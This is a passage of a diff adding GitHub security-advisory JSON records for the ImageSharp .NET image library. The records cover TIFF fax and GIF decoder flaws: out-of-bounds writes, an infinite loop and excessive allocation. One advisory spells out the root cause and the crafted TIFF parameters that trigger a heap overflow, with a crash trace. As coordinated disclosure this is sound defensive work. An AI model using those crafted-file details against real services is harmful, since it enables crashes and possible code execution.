+        "subscriptions_url": "https://api.github.com/users/JimBobSquarePants/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/JimBobSquarePants",
+        "user_view_type": "public"
+      },
+      "severity": "high",
+      "state": "published",
+      "submission": null,
+      "summary": "CCITT fax decompression (T4/Modified Huffman): unbounded WriteBits overflows strip buffer — heap OOB write in SixLabors.ImageSharp",
+      "updated_at": "2026-10-09T11:35:32Z",
+      "url": "https://api.github.com/repos/SixLabors/ImageSharp/security-advisories/GHSA-jj3q-cwqj-842r",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "3.2.0",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": ">= 3.0.0, < 3.2.0"
+        },
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "4.1.1",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": ">= 4.0.0, < 4.1.1"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 2,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "KimiSecurityTeam",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/310079311?v=4",
+            "events_url": "https://api.github.com/users/KimiSecurityTeam/events{/privacy}",
+            "followers_url": "https://api.github.com/users/KimiSecurityTeam/followers",
+            "following_url": "https://api.github.com/users/KimiSecurityTeam/following{/other_user}",
+            "gists_url": "https://api.github.com/users/KimiSecurityTeam/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/KimiSecurityTeam",
+            "id": 310079311,
+            "login": "KimiSecurityTeam",
+            "node_id": "U_kgDOEntvTw",
+            "organizations_url": "https://api.github.com/users/KimiSecurityTeam/orgs",
+            "received_events_url": "https://api.github.com/users/KimiSecurityTeam/received_events",
+            "repos_url": "https://api.github.com/users/KimiSecurityTeam/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/KimiSecurityTeam/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/KimiSecurityTeam/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/KimiSecurityTeam",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": "CVE-2026-106118",
+      "cvss": {
+        "score": 7.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 7.5,
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-787"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-787",
+          "name": "Out-of-bounds Write"
+        }
+      ],
+      "description": "### Patched versions\n\nFixed in ImageSharp **3.2.0** and **4.1.1**. Users on v3 should upgrade to 3.2.0; users on v4 should upgrade to 4.1.1 or later.\n\n## Summary\r\n\r\nWhen decoding a tiled TIFF with fax compression (T4/T6/MH), `DecodeTilesChunky` allocates each tile buffer from **TileWidth** (`ceil(TileWidth*bpp/8)*TileLength` bytes) but constructs the fax decompressor with **frame.Width**: `TiffDecompressorsFactory` ignores the `isTiled/tileWidth/tileHeight` parameters entirely. The T4/T6/MH decompressors treat the full image width as the scanline length and advance (and really write, via read-modify-write bit ops) `frame.Width` bits per row, with no bounds check against the tile buffer. The very first tile therefore writes linearly out of bounds — about `ImageWidth/8` bytes per row × TileLength rows into a `TileWidth`-sized buffer. With ImageWidth=4,000,000, TileWidth=16, TileLength=16 this writes ~2 MB past a 32-byte buffer and kills the process deterministically; a T6 all-white variant advances the bit offset by >512 MB silently, showing an alarm-free heap-corruption window for the same defect. A crafted file fully controls the OOB length per tile and works with perfectly legal per-row run codes (no overlong runs needed).\r\n\r\nVerified at commit `5cd4d0d26a82a9549f297a237aea9cf665bddff8` (main; v4.1.0 was the latest release at the time of verification).\r\n\r\n## Details\r\n\r\nRoot cause: a size mismatch between tile buffer allocation and decompressor width, because the factory drops the tile parameters.\r\n\r\n- Allocation: [TiffDecoderCore.cs#L792-L794](https://github.com/SixLabors/ImageSharp/blob/5cd4d0d26a82a9549f297a237aea9cf665bddff8/src/ImageSharp/Formats/Tiff/TiffDecoderCore.cs#L792-L794) — `bytesPerTileRow = RoundUpToMultipleOfEight(tileWidth*bitsPerPixel)`; tile buffer = `bytesPerTileRow*tileLength` bytes (32 bytes in the PoC)\r\n- Mismatch: [TiffDecoderCore.cs#L797](https://github.com/SixLabors/ImageSharp/blob/5cd4d0d26a82a9549f297a237aea9cf665bddff8/src/ImageSharp/Formats/Tiff/TiffDecoderCore.cs#L797) — `CreateDecompressor<TPixel>(frame.Width, ..., isTiled: true, tileWidth, tileLength)` passes the full frame width\r\n- Factory drops tile params: [TiffDecompressorsFactory.cs#L56-L64](https://github.com/SixLabors/ImageSharp/blob/5cd4d0d26a82a9549f297a237aea9cf665bddff8/src/ImageSharp/Formats/Tiff/Compression/TiffDecompressorsFactory.cs#L56-L64) — T4/T6/MH decompressors receive only `width` (= frame.Width); `isTiled/tileWidth/tileHeight` ignored\r\n- OOB write sink: [T4TiffCompression.cs#L69-L119](https://github.com/SixLabors/ImageSharp/blob/5cd4d0d26a82a9549f297a237aea9cf665bddff8/src/ImageSharp/Formats/Tiff/Compression/Decompressors/T4TiffCompression.cs#L69-L119), `T6TiffCompression.cs#L76-L108` — per-row advance of `this.width` bits via `BitWriterUtils.WriteBits` with no buffer-length check ([BitWriterUtils.cs#L51](https://github.com/SixLabors/ImageSharp/blob/5cd4d0d26a82a9549f297a237aea9cf665bddff8/src/ImageSharp/Formats/Tiff/Compression/BitWriterUtils.cs#L51)); note `TiffDecoderCore.cs:829-831` later reads the buffer in `bytesPerTileRow` strides, confirming the protocol expects tile-width rows\r\n\r\nAttack surface: `Image.Load(stream)` on an attacker-supplied tiled TIFF (`TiffDecoderCore.DecodeImageWithTiles` → `DecodeTilesChunky`). Default configuration; only requirement is a standard tiled TIFF header (TileWidth=16, TileLength=16) + Compression=3 (T4; T6 also constructible).\r\n\r\n**Suggested remediation:**\r\n1. Short-term: when `isTiled`, construct the T4/T6/MH decompressor with `tileWidth` (not frame width), or clip row writes to the caller-provided buffer length.\r\n2. Root fix: bound the write side of `BitWriterUtils` (pass remaining bits), and validate every fax row advance against buffer capacity on both tiled and strip paths.\r\n3. Regression tests: Compression=2/3/4 × tiled with TileWidth < ImageWidth, including a T6 black-pixel row (forces real `WriteBit`).\r\n\r\n## PoC\r\n\r\nFull PoC posted as the first comment below: `Program.cs` (driver), `poc-tiled-t4.tif` (crafted file, ~9.8 KB, base64 inline), README.\r\n\r\n1. Build a small console project referencing `src/ImageSharp/ImageSharp.csproj` and run it against the crafted file (or call `Image.Load` on it from any host).\r\n2. Observed with ImageWidth=4,000,000, TileWidth=16, TileLength=16, T4 with 400 makeup codes + EOL per row:\r\n\r\n   ```\r\n   tile payload 9642 bytes; rows write ~2,048,000 bytes into a 32-byte buffer\r\n   Fatal error. System.AccessViolationException: Attempted to read or write protected memory.\r\n      at SixLabors.ImageSharp.Formats.Tiff.Compression.BitWriterUtils.WriteBits(Span`1<Byte>, IntPtr, IntPtr, Byte)\r\n      at ...T4TiffCompression.WritePixelRun(...)\r\n      at ...T4TiffCompression.Decompress(...)\r\n   Aborted (core dumped); exit=134\r\n   ```\r\n\r\n3. Controls: the same file with Compression=None decodes normally (container is fine); a T6 all-white-rows variant advances >512 MB of bit offset without a real write (silent corruption window) before tripping on a directory-level TileOffsets count check.\r\n\r\n## Impact\r\n\r\n- **What it is:** out-of-bounds write (CWE-787). For any service decoding untrusted tiled TIFFs: remote, default-configuration, deterministic process crash (DoS), plus a heap OOB write whose per-tile length and row width are attacker-tunable — a potential code-execution surface. This is a vulnerability in the library itself, in scope of your SECURITY.md.\r\n- **Who is impacted:** applications decoding untrusted TIFF with SixLabors.ImageSharp at the current major (verified on main past v4.1.0); tiled + fax-compressed files are the trigger, which ordinary TIFF writers can produce.\r\n\r\n---\r\n\r\n---\r\n\r\nReported by **Kimi Security Team** (bug-report@moonshot.ai). We follow coordinated disclosure and have not published any details. Happy to test a patch.",
+      "ghsa_id": "GHSA-v76p-62qx-wwq2",
+      "html_url": "https://github.com/SixLabors/ImageSharp/security/advisories/GHSA-v76p-62qx-wwq2",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-v76p-62qx-wwq2"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2026-106118"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-08-20T09:48:49Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/385879?v=4",
+        "events_url": "https://api.github.com/users/JimBobSquarePants/events{/privacy}",
+        "followers_url": "https://api.github.com/users/JimBobSquarePants/followers",
+        "following_url": "https://api.github.com/users/JimBobSquarePants/following{/other_user}",
+        "gists_url": "https://api.github.com/users/JimBobSquarePants/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/JimBobSquarePants",
+        "id": 385879,
+        "login": "JimBobSquarePants",
+        "node_id": "MDQ6VXNlcjM4NTg3OQ==",
+        "organizations_url": "https://api.github.com/users/JimBobSquarePants/orgs",
+        "received_events_url": "https://api.github.com/users/JimBobSquarePants/received_events",
+        "repos_url": "https://api.github.com/users/JimBobSquarePants/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/JimBobSquarePants/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/JimBobSquarePants/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/JimBobSquarePants",
+        "user_view_type": "public"
+      },
+      "severity": "high",
+      "state": "published",
+      "submission": null,
+      "summary": "Tiled fax TIFF: tile buffer sized by TileWidth but fax decompressor writes scanlines of ImageWidth — heap OOB write in SixLabors.ImageSharp",
+      "updated_at": "2026-10-09T11:35:37Z",
+      "url": "https://api.github.com/repos/SixLabors/ImageSharp/security-advisories/GHSA-v76p-62qx-wwq2",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "3.2.0",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": ">= 3.0.0, < 3.2.0"
+        },
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "4.1.1",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": ">= 4.0.0, < 4.1.1"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 1,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "whatevicanhaz",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/176824600?v=4",
+            "events_url": "https://api.github.com/users/whatevicanhaz/events{/privacy}",
+            "followers_url": "https://api.github.com/users/whatevicanhaz/followers",
+            "following_url": "https://api.github.com/users/whatevicanhaz/following{/other_user}",
+            "gists_url": "https://api.github.com/users/whatevicanhaz/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/whatevicanhaz",
+            "id": 176824600,
+            "login": "whatevicanhaz",
+            "node_id": "U_kgDOCoohGA",
+            "organizations_url": "https://api.github.com/users/whatevicanhaz/orgs",
+            "received_events_url": "https://api.github.com/users/whatevicanhaz/received_events",
+            "repos_url": "https://api.github.com/users/whatevicanhaz/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/whatevicanhaz/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/whatevicanhaz/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/whatevicanhaz",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": "CVE-2025-54575",
+      "cvss": {
+        "score": 5.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 5.3,
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [],
+      "cwes": [],
+      "description": "### Impact\r\nA specially crafted GIF file containing a malformed comment extension block (with a missing block terminator) can cause the ImageSharp GIF decoder to enter an infinite loop while attempting to skip the block. This leads to a denial of service. Applications processing untrusted GIF input should upgrade to a patched version.\r\n\r\n### Patches\r\nThe problem has been patched. All users are advised to upgrade to v3.1.11 or v2.1.11.\r\n\r\n### Workarounds\r\nNone.\r\n\r\n### References\r\nhttps://github.com/SixLabors/ImageSharp/issues/2953\r\n",
+      "ghsa_id": "GHSA-rxmq-m78w-7wmc",
+      "html_url": "https://github.com/SixLabors/ImageSharp/security/advisories/GHSA-rxmq-m78w-7wmc",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-rxmq-m78w-7wmc"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2025-54575"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2025-07-30T09:14:25Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/385879?v=4",
+        "events_url": "https://api.github.com/users/JimBobSquarePants/events{/privacy}",
+        "followers_url": "https://api.github.com/users/JimBobSquarePants/followers",
+        "following_url": "https://api.github.com/users/JimBobSquarePants/following{/other_user}",
+        "gists_url": "https://api.github.com/users/JimBobSquarePants/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/JimBobSquarePants",
+        "id": 385879,
+        "login": "JimBobSquarePants",
+        "node_id": "MDQ6VXNlcjM4NTg3OQ==",
+        "organizations_url": "https://api.github.com/users/JimBobSquarePants/orgs",
+        "received_events_url": "https://api.github.com/users/JimBobSquarePants/received_events",
+        "repos_url": "https://api.github.com/users/JimBobSquarePants/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/JimBobSquarePants/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/JimBobSquarePants/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/JimBobSquarePants",
+        "user_view_type": "public"
+      },
+      "severity": "medium",
+      "state": "published",
+      "submission": null,
+      "summary": "Infinite Loop in GIF Decoder When Skipping Malformed Comment Extension Blocks",
+      "updated_at": "2025-07-30T16:49:07Z",
+      "url": "https://api.github.com/repos/SixLabors/ImageSharp/security-advisories/GHSA-rxmq-m78w-7wmc",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "2.1.11",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 2.1.11"
+        },
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "3.1.11",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 3.1.11"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 1,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "andreas-eriksson",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/4438107?v=4",
+            "events_url": "https://api.github.com/users/andreas-eriksson/events{/privacy}",
+            "followers_url": "https://api.github.com/users/andreas-eriksson/followers",
+            "following_url": "https://api.github.com/users/andreas-eriksson/following{/other_user}",
+            "gists_url": "https://api.github.com/users/andreas-eriksson/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/andreas-eriksson",
+            "id": 4438107,
+            "login": "andreas-eriksson",
+            "node_id": "MDQ6VXNlcjQ0MzgxMDc=",
+            "organizations_url": "https://api.github.com/users/andreas-eriksson/orgs",
+            "received_events_url": "https://api.github.com/users/andreas-eriksson/received_events",
+            "repos_url": "https://api.github.com/users/andreas-eriksson/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/andreas-eriksson/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/andreas-eriksson/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/andreas-eriksson",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": "CVE-2025-27598",
+      "cvss": {
+        "score": 7.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 7.5,
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-787"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-787",
+          "name": "Out-of-bounds Write"
+        }
+      ],
+      "description": "### Impact\r\nAn Out-of-bounds Write vulnerability has been found in the ImageSharp gif decoder, allowing attackers to cause a crash using a specially crafted gif. This can potentially lead to denial of service.\r\n\r\n### Patches\r\nThe problem has been patched. All users are advised to upgrade to v3.1.7 or v2.1.10.\r\n\r\n### Workarounds\r\nNone.\r\n\r\n### References\r\nhttps://github.com/SixLabors/ImageSharp/issues/2859\r\nhttps://github.com/SixLabors/ImageSharp/issues/2890\r\n",
+      "ghsa_id": "GHSA-2cmq-823j-5qj8",
+      "html_url": "https://github.com/SixLabors/ImageSharp/security/advisories/GHSA-2cmq-823j-5qj8",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-2cmq-823j-5qj8"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2025-27598"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2025-03-06T19:42:23Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/6835152?v=4",
+        "events_url": "https://api.github.com/users/antonfirsov/events{/privacy}",
+        "followers_url": "https://api.github.com/users/antonfirsov/followers",
+        "following_url": "https://api.github.com/users/antonfirsov/following{/other_user}",
+        "gists_url": "https://api.github.com/users/antonfirsov/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/antonfirsov",
+        "id": 6835152,
+        "login": "antonfirsov",
+        "node_id": "MDQ6VXNlcjY4MzUxNTI=",
+        "organizations_url": "https://api.github.com/users/antonfirsov/orgs",
+        "received_events_url": "https://api.github.com/users/antonfirsov/received_events",
+        "repos_url": "https://api.github.com/users/antonfirsov/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/antonfirsov/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/antonfirsov/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/antonfirsov",
+        "user_view_type": "public"
+      },
+      "severity": "high",
+      "state": "published",
+      "submission": null,
+      "summary": "Out-of-bounds Write in SixLabors ImageSharp",
+      "updated_at": "2025-03-06T19:42:23Z",
+      "url": "https://api.github.com/repos/SixLabors/ImageSharp/security-advisories/GHSA-2cmq-823j-5qj8",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "3.1.7",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 3.1.7"
+        },
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "2.1.10",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 2.1.10"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 1,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "ErazerBrecht",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/6287467?v=4",
+            "events_url": "https://api.github.com/users/ErazerBrecht/events{/privacy}",
+            "followers_url": "https://api.github.com/users/ErazerBrecht/followers",
+            "following_url": "https://api.github.com/users/ErazerBrecht/following{/other_user}",
+            "gists_url": "https://api.github.com/users/ErazerBrecht/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/ErazerBrecht",
+            "id": 6287467,
+            "login": "ErazerBrecht",
+            "node_id": "MDQ6VXNlcjYyODc0Njc=",
+            "organizations_url": "https://api.github.com/users/ErazerBrecht/orgs",
+            "received_events_url": "https://api.github.com/users/ErazerBrecht/received_events",
+            "repos_url": "https://api.github.com/users/ErazerBrecht/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/ErazerBrecht/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/ErazerBrecht/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/ErazerBrecht",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": "CVE-2024-41132",
+      "cvss": {
+        "score": 5.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 5.3,
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-789"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-789",
+          "name": "Memory Allocation with Excessive Size Value"
+        }
+      ],
+      "description": "### Impact\r\n_What kind of vulnerability is it? Who is impacted?_\r\n\r\nA vulnerability discovered in the ImageSharp library, where the processing of specially crafted files can lead to excessive memory usage in the Gif decoder. The vulnerability is triggered when ImageSharp attempts to process image files that are designed to exploit this flaw.\r\n\r\n### Patches\r\n_Has the problem been patched? What versions should users upgrade to?_\r\n\r\nThe problem has been patched. All users are advised to upgrade to v3.1.5 or v2.1.9.\r\n\r\n### Workarounds\r\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\r\n\r\nBefore calling `Image.Decode(Async)`, use `Image.Identify` to determine the image dimensions in order to enforce a limit.\r\n\r\n### References\r\n_Are there any links users can visit to find out more?_\r\n- https://github.com/SixLabors/ImageSharp/pull/2759\r\n- https://github.com/SixLabors/ImageSharp/pull/2764\r\n- https://github.com/SixLabors/ImageSharp/pull/2770\r\n- ImageSharp: [Security Considerations](https://docs.sixlabors.com/articles/imagesharp/security.html)\r\n- ImageSharp.Web: [Securing Processing Commands](https://docs.sixlabors.com/articles/imagesharp.web/processingcommands.html#securing-processing-commands)",
+      "ghsa_id": "GHSA-qxrv-gp6x-rc23",
+      "html_url": "https://github.com/SixLabors/ImageSharp/security/advisories/GHSA-qxrv-gp6x-rc23",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-qxrv-gp6x-rc23"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2024-41132"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2024-07-22T10:20:41Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/385879?v=4",
+        "events_url": "https://api.github.com/users/JimBobSquarePants/events{/privacy}",
+        "followers_url": "https://api.github.com/users/JimBobSquarePants/followers",
+        "following_url": "https://api.github.com/users/JimBobSquarePants/following{/other_user}",
+        "gists_url": "https://api.github.com/users/JimBobSquarePants/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/JimBobSquarePants",
+        "id": 385879,
+        "login": "JimBobSquarePants",
+        "node_id": "MDQ6VXNlcjM4NTg3OQ==",
+        "organizations_url": "https://api.github.com/users/JimBobSquarePants/orgs",
+        "received_events_url": "https://api.github.com/users/JimBobSquarePants/received_events",
+        "repos_url": "https://api.github.com/users/JimBobSquarePants/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/JimBobSquarePants/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/JimBobSquarePants/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/JimBobSquarePants",
+        "user_view_type": "public"
+      },
+      "severity": "medium",
+      "state": "published",
+      "submission": null,
+      "summary": "Excessive Memory Allocation in Gif Decoder",
+      "updated_at": "2024-07-22T13:57:37Z",
+      "url": "https://api.github.com/repos/SixLabors/ImageSharp/security-advisories/GHSA-qxrv-gp6x-rc23",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "2.1.9",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 2.1.9"
+        },
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "3.1.5",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 3.1.5"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 1,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "Erik-White",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/26148654?v=4",
+            "events_url": "https://api.github.com/users/Erik-White/events{/privacy}",
+            "followers_url": "https://api.github.com/users/Erik-White/followers",
+            "following_url": "https://api.github.com/users/Erik-White/following{/other_user}",
+            "gists_url": "https://api.github.com/users/Erik-White/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/Erik-White",
+            "id": 26148654,
+            "login": "Erik-White",
+            "node_id": "MDQ6VXNlcjI2MTQ4NjU0",
+            "organizations_url": "https://api.github.com/users/Erik-White/orgs",
+            "received_events_url": "https://api.github.com/users/Erik-White/received_events",
+            "repos_url": "https://api.github.com/users/Erik-White/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/Erik-White/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/Erik-White/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/Erik-White",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": "CVE-2024-41131",
+      "cvss": {
+        "score": 7.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 7.5,
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-787"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-787",
+          "name": "Out-of-bounds Write"
+        }
+      ],
+      "description": "### Impact\r\nAn Out-of-bounds Write vulnerability has been found in the ImageSharp gif decoder, allowing attackers to cause a crash using a specially crafted gif. This can potentially lead to denial of service.\r\n\r\n### Patches\r\nThe problem has been patched. All users are advised to upgrade to v3.1.5 or v2.1.9.\r\n\r\n### Workarounds\r\nNone.\r\n\r\n### References\r\nhttps://github.com/SixLabors/ImageSharp/pull/2754\r\nhttps://github.com/SixLabors/ImageSharp/pull/2756\r\n",
+      "ghsa_id": "GHSA-63p8-c4ww-9cg7",
+      "html_url": "https://github.com/SixLabors/ImageSharp/security/advisories/GHSA-63p8-c4ww-9cg7",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-63p8-c4ww-9cg7"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2024-41131"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2024-07-22T10:20:03Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/385879?v=4",
+        "events_url": "https://api.github.com/users/JimBobSquarePants/events{/privacy}",
+        "followers_url": "https://api.github.com/users/JimBobSquarePants/followers",
+        "following_url": "https://api.github.com/users/JimBobSquarePants/following{/other_user}",
+        "gists_url": "https://api.github.com/users/JimBobSquarePants/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/JimBobSquarePants",
+        "id": 385879,
+        "login": "JimBobSquarePants",
+        "node_id": "MDQ6VXNlcjM4NTg3OQ==",
+        "organizations_url": "https://api.github.com/users/JimBobSquarePants/orgs",
+        "received_events_url": "https://api.github.com/users/JimBobSquarePants/received_events",
+        "repos_url": "https://api.github.com/users/JimBobSquarePants/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/JimBobSquarePants/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/JimBobSquarePants/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/JimBobSquarePants",
+        "user_view_type": "public"
+      },
+      "severity": "high",
+      "state": "published",
+      "submission": null,
+      "summary": "Out-of-bounds Write in SixLabors ImageSharp",
+      "updated_at": "2024-07-22T13:57:23Z",
+      "url": "https://api.github.com/repos/SixLabors/ImageSharp/security-advisories/GHSA-63p8-c4ww-9cg7",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
